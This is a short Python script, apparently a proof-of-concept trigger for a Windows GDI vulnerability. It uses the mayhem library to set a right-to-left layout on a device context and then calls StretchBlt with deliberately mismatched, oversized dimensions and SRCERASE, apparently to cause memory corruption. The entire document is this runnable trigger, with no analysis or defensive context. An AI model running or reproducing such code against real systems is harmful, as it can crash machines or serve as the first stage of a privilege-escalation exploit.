from mayhem.windll.gdi32 import *

SRCCOPY  = 0x00CC0020
SRCERASE = 0x00440328

def main():
    hdc1 = CreateCompatibleDC(0x0)
    hbm1 = CreateCompatibleBitmap(hdc1, 0x80, 0xf000)
    SelectObject(hdc1, hbm1)
    SetLayout(hdc1, 0x2)
    StretchBlt(hdc1, 0x0, 0x2, 0x100, 0x1, hdc1, 0x0, 0x0, 0x400, 0x8000, SRCERASE)
    return 0

if __name__ == '__main__':
    main()
